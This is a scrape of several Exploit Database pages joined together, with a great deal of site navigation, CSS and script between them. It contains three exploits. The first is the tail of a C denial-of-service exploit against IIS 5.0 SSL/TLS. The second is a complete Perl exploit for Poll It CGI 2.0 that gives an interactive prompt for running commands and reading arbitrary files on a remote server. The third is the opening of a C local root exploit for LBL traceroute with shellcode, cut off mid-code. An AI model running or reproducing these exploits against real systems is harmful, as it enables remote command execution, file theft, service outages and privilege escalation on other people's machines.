x9F,0x65,0xF7,0xFF,0xD0,0xE8,0x2E,0xB9,0x58,0x3A,0xDC,0x68,0xA3,0xBD,0x05,0x5B,0x28,0x66,0xF5,0x23,0x87,0xE7,0x0C,0xCE,0xD1,0x07,0x4D,0x8D,0xB8,0x40,0x86,0x12,0xFF,0x60,0x73,0x0F,0xA6,0x91,0x71,0xAC,0x23,0xCC,0x5A,0xB1,0x5C,0xAD,0x62,0xD5,0xE9,0x73,0xC7,0xCC,0x13,0x95,0x08,0xCE,0xD9,0x75,0xB4,0xB1,0xE5,0x46,0x0C,0x85,0xE1,0x50,0x1A,0xBC,0x53,0x4B,0xD1,0x5B,0x1A,0xD7,0x7A,0xD7,0x47,0xC5,0xFC,0x5B,0xA8,0x19,0xB8,0x6D,0xF6,0xD6,0x7B,0x97,0x38,0xD4,0x71,0x3E,0x60,0xA3,0xCB,0x02,0x4C,0xB5,0x26,0xEE,0xB4,0xF9,0x31,0x3F,0xB7,0xAE,0x65,0xBC,0x4C,0x6F,0x14,0x03,0x00,0x00,0x01,0x01,0x16,0x03,0x00,0x00,0x40,0x72,0x12,0x84,0x91,0x08,0x56,0xDC,0x9A,0x1F,0x49,0x35,0x9F,0xC7,0x70,0x16,0x14,0xAE,0xED,0x32,0x89,0x46,0x10,0x18,0x73,0xB5,0x40,0xB7,0xBA,0xCC,0xB0,0x75,0xCF,0x96,0x3E,0xDC,0x0F,0x97,0xEE,0xDC,0x3A,0x0F,0xB7,0xD2,0xCD,0x8B,0x0C,0x99,0xDB,0xA6,0x1E,0xD0,0xF9,0x32,0xCD,0x3B,0xE6,0x32,0xBD,0xC4,0xA9,0x62,0x2F,0xD5,0xC6};struct ssl_hello {char handshake;short version;short length;char client_hello;char client_length[3];short client_version;int timestamp;char random_bytes[28];char session_id_length;char session_id[32];short cipher_length;char cipher_suite[52];char compression_length;char compression_method;} __attribute__((packed)) ssl_hello;int tls;intmain(int argc, char *argv[]){struct sockaddr_in addr;int sock,i;char buffer[32];setvbuf(stdout, NULL, _IONBF, 0);printf("\n<*> S21sec Microsoft IIS 5.0 SSL/TLS Remote DoS <*>\n\n");tls=0;if ((argc != 4) && (argc != 3)){printf(" Usage: %s [host] [port] {t}\n", argv[0]);printf(" host - Host (name/IP) to connect to.\n");printf(" port - TCP port to connect to.\n");printf(" t - Enable TLS (disabled by default).\n\n");exit(1);}if (argc == 4){if ( strcmp(argv[3], "t")){printf(" -> Ouch!! What is '%s'?\n\n",argv[3]);exit(1);}else{tls=1;bin_data[2]=0x01;}}memset(&addr, 0, sizeof(addr));addr.sin_family = AF_INET;addr.sin_port = htons(atoi(argv[2]));if ( exist_host( argv[1], (u_long *)&(addr.sin_addr.s_addr) ) ){printf(" -> Ouch!! Wrong or nonexistant host '%s'!!\n\n",argv[1]);exit(1);}if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){printf(" -> Error on socket(): %s\n", strerror(errno));exit(1);}printf(" -> Connecting to %s:%s...",argv[1],argv[2]);if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1){printf("\n -> Error on connect(): %s\n", strerror(errno));exit(1);}init_hello();printf(" OK\n -> Sending %s Client Hello...",((tls)?"TLS":"SSL"));if (write(sock, (void *)&ssl_hello, sizeof(struct ssl_hello)) == -1){printf("\n -> Error on write(): %s\n", strerror(errno));exit(1);}printf(" OK\n -> Waiting for %s Server Hello...",((tls)?"TLS":"SSL"));if (read(sock, (void *)buffer, sizeof(buffer)) == -1){printf("\n -> Error on read(): %s\n", strerror(errno));exit(1);}printf(" OK\n -> Sending bomb...");if (write(sock, (void *)bin_data, sizeof(bin_data)) == -1){printf("\n -> Error on write(): %s\n", strerror(errno));exit(1);}for (i=0; i<6 ; i++){printf(" B00M!!");usleep(350000);}close(sock);printf("\n ->\n -> OK. If DoS has been worked you will not be able to negotiate %s with %s:%s\n\n",((tls)?"TLS":"SSL"),argv[1],argv[2]);exit(0);}intexist_host( char *nom_host, u_long *bin_host ){struct hostent *hinfo;struct sockaddr_in host_tmp;struct in_addr host_binario;memset( (char *)&host_tmp, 0, sizeof(host_tmp) );memset( (char *)&host_binario, 0, sizeof(host_binario) );host_tmp.sin_family = AF_INET;if ( inet_aton( nom_host, &host_binario) ){memcpy( (char *)bin_host, (char *)&host_binario, sizeof(host_binario));return 0;}if ( (hinfo = gethostbyname( nom_host )) ) /* Put nom_host into bin_host */{memcpy((char *)&host_tmp.sin_addr, hinfo->h_addr, hinfo->h_length);memcpy((char *)bin_host, (char *) &host_tmp.sin_addr.s_addr,sizeof( host_tmp.sin_addr.s_addr));return 0;}return 1;}voidinit_hello(void){ssl_hello.handshake = 0x16;if (!tls)ssl_hello.version = htons(0x0300);elsessl_hello.version = htons(0x0301);ssl_hello.length = htons(0x007f);ssl_hello.client_hello = 0x01;memcpy((void *)ssl_hello.client_length, (void *)"\x00\x00\x7b", 3);if (!tls)ssl_hello.client_version = htons(0x0300);elsessl_hello.client_version = htons(0x0301);ssl_hello.timestamp = htonl(0x407babc0);memset((void *) ssl_hello.random_bytes, 0x66, 28);ssl_hello.session_id_length = 0x20;memset((void *) ssl_hello.session_id, 0x66, 32);ssl_hello.cipher_length = htons(0x0034);memcpy((void *)ssl_hello.cipher_suite, (void *)cipher_suites, sizeof(cipher_suites));ssl_hello.compression_length = 0x01;ssl_hello.compression_method = 0x00;}// milw0rm.com [2004-04-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 177
Poll It CGI 2.0 - Multiple Vulnerabilities - CGI webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDPoll It CGI 2.0 - Multiple VulnerabilitiesEDB-ID:177CVE:2000-1069EDB Verified:Author:keelisType:webappsExploit:/Platform:CGIDate:2000-11-15Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED#!/usr/bin/perl#######################################                                    ##                                    ##      Poll It CGI v2.0 exploit      ##       keelis/havoc korp 2000       ##                                    ##    shouts to modjo, p, zen, kd,    ##     ab, all the script kiddies.    ##                                    ##                                    ##     keelis(at)hushmail(dot)com     ##                                    ##                                    #######################################use Socket;($host, $cgi_loc) = @ARGV[0,1];$ip=inet_aton($host);print("\n\t+---   Poll It CGI v2.0 exploit  ---+");print("\n\t+---    keelis/havoc korp 2000   ---+\n\n\n");usage() if (!defined($host) || !defined($cgi_loc));while(true){print "[poll\@$host] ";$stdin = \*STDIN;$cmdin = <$stdin>;chomp($cmdin);($cmd, $param) = split(/ /, $cmdin, 2);if ($cmd eq "d"){$request = "?load=admin&admin_password=&action=delete_poll";$success_msg = "current poll has been deleted\n\n";make_request();}if ($cmd eq "e"){$request = "?load=admin&admin_password=&action=expire_poll";$success_msg = "current poll has been expired\n\n";make_request();}if ($cmd eq "c"){if (!defined($param)){print "you need to specify a voting topic for the new poll\n\n";next;}$request = "?load=admin&admin_password=&action=create_new&new_pollaction=1&show_after=1&new_title=$param";$success_msg = "created new poll with voting topic: \"$param\"\n\n";make_request();}if ($cmd eq "a"){if (!defined($param)){print "you need to specify the text for the new voting option\n\n";next;}$request = "?load=admin&admin_password=&action=add_option&add_option=$param";$success_msg = "voting option added to current poll: \"$param\"\n\n";make_request();}if ($cmd eq "g"){if (!defined($param)){print "you need to specify the command to be run\n\n";next;}$request = "?load=admin&admin_password=&action=add_option&add_option=none&poll_options=$param%7C";$success_msg = "command has been run on remote server: \"$param\"\n\n";make_request();}if ($cmd eq "r"){if (!defined($param)){print "you need to specify the file to be read\n\n";next;}$request = "?load=admin&data_dir=$param%00";$success_msg = "contents of \"$param\" follow:\n\n";make_request();}if ($cmd eq "?" || $cmd eq "h" || $cmd eq "help"){print "\n? \t\tshow this help screen\n";print "d \t\tdelete current poll\n";print "e \t\texpire current poll\n";print "c <param>\tcreate new poll using <param> as topic\n";print "a <param>\tadd <param> to voting options\n";print "r <param>\tread the file <param> in remote server\n";print "g <param>\trun <param> in the remote server\n";print "x \t\texit pollex.pl shell\n\n";next;}if ($cmd eq "x"){print "\n";last;}print "command not found. use \"?\" for help screen.\n\n";}sub make_request {$request=~s/ /+/g;$request=~s/\\/%5C/g;$request=~s/\//%2F/g;my @req=sendraw("GET $cgi_loc$request HTTP/1.1\r\nHost: $host\r\n\r\n");$reqanswer=join('', @req);($httpv, $httpcode) = split(/ /, $reqanswer);$httpcode = substr($httpcode, 0, 3);if ($httpcode eq "200") {print $success_msg if ($cmd ne "r");} else {if ($httpcode ne "404"){print "httpd returned an error code:\n\n";print $reqanswer,"\n";} else {die "unexpected httpd error code 404. aborting...\n\n"}}if ($cmd eq "r"){	$reqanswer=substr($reqanswer, index($reqanswer, "\r\n\r\n")+4);if (substr($reqanswer, 6, 15) eq "Template : File"){print "file \"$param\" not found or non-readable from cgi\n\n";} else {print $success_msg;print $reqanswer,"\n";}}next;}sub usage {print "Usage:  pollex.pl <host> <cgi_loc>\n\n";print "\thost   :\thost/ip where CGI resides\n";print "\tcgi_loc:\tpath to the CGI (non-SSI version needed)\n\n";exit(0);}sub sendraw {my ($pstr)=@_;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||die("socket problems... aborting.\n");if(connect(S,pack "SnA4x8",2,80,$ip)){select(S);$|=1;print $pstr;my @in=<S>;select(STDOUT);close(S);return @in;} else {die("can\'t connect... aborting.\n");}}# milw0rm.com [2000-11-15]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 178
LBL Traceroute - Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLBL Traceroute - Local Privilege EscalationEDB-ID:178CVE:2000-0949EDB Verified:Author:Michel KaempfType:localExploit:/Platform:LinuxDate:2000-11-15Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** MasterSecuritY <www.mastersecurity.fr>** openwall.c - Local root exploit in LBNL traceroute* Copyright (C) 2000  Michel "MaXX" Kaempf <maxx@mastersecurity.fr>** Updated versions of this exploit and the corresponding advisory will* be made available at:** ftp://maxx.via.ecp.fr/traceroot/** This program is free software; you can redistribute it and/or modify* it under the terms of the GNU General Public License as published by* the Free Software Foundation; either version 2 of the License, or* (at your option) any later version.** This program is distributed in the hope that it will be useful,* but WITHOUT ANY WARRANTY; without even the implied warranty of* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the* GNU General Public License for more details.** You should have received a copy of the GNU General Public License* along with this program; if not, write to the Free Software* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA*/#include <stdio.h>#include <stdlib.h>#include <string.h>#include <unistd.h>#define PREV_INUSE 0x1#define IS_MMAPPED 0x2char *		filename = "/usr/sbin/traceroute";unsigned int	stack = 0xc0000000 - 4;unsigned int	p = 0x0804ce38;unsigned int	victim = 0x0804c88c;char * jmp = "\xeb\x0aXXYYYYZZZZ";char * shellcode =/* <shellcode>:		xor	%edx,%edx	*/"\x31\xd2"/* <shellcode+2>:	mov	%edx,%eax	*/"\x89\xd0"/* <shellcode+4>:	mov	$0xb,%al	*/"\xb0\x0b"/* <shellcode+6>:	mov	$XXXX,%ebx	*/"\xbbXXXX"/* <shellcode+11>:	mov	$XXXX,%ecx	*/"\xb9XXXX"/* <shellcode+16>:	mov	%ebx,(%ecx)	*/"\x89\x19"/* <shellcode+18>:	mov	%edx,0x4(%ecx)	*/"\x89\x51\x04"/* <shellcode+21>:	int	$0x80		*/"\xcd\x80";char * program = "/bin/sh";int zero( unsigned int ui ){if ( !(ui & 0xff000000) || !(ui & 0x00ff0000) || !(ui & 0x0000ff00) || !(ui & 0x000000ff) ) {return( -1 );}return( 0 );}int main(){char		gateway[ 1337 ];char		host[ 1337 ];char *		argv[] = { filename, "-g", "123", "-g", gateway, host, NULL };unsigned int	next;int		i;unsigned int	hellcode;unsigned int	size;strcpy( host, "AAAABBBBCCCCDDDDEEEE" );next = stack - (strlen(filename) + 1) - (strlen(host) + 1) + strlen("AAAA");for ( i = 0; i < next - (next & ~3); i++ ) {strcat( host, "X" );}next = next & ~3;((unsigned int *)host)[1] = 0xffffffff & ~PREV_INUSE;((unsigned int *)host)[2] = 0xffffffff;if ( zero( victim - 12 ) ) {fprintf( stderr, "Null byte(s) in `victim - 12' (0x%08x)!\n", victim - 12 );return( -1 );}((unsigned int *)host)[3] = victim - 12;hellcode = p + (strlen("123") + 1) + strlen("0x42.0x42.0x42.0x42") + strlen(" ");if ( zero( hellcode ) ) {fprintf( stderr, "Null byte(s) in `host' (0x%08x)!\n", hellcode );return( -1 );}((unsigned int *)host)[4] = hellcode;size = next - (p - 4);size = size | PREV_INUSE;sprintf(gateway,"0x%02x.0x%02x.0x%02x.0x%02x",((unsigned char *)(&size))[0],((unsigned char *)(&size))[1],((unsigned char 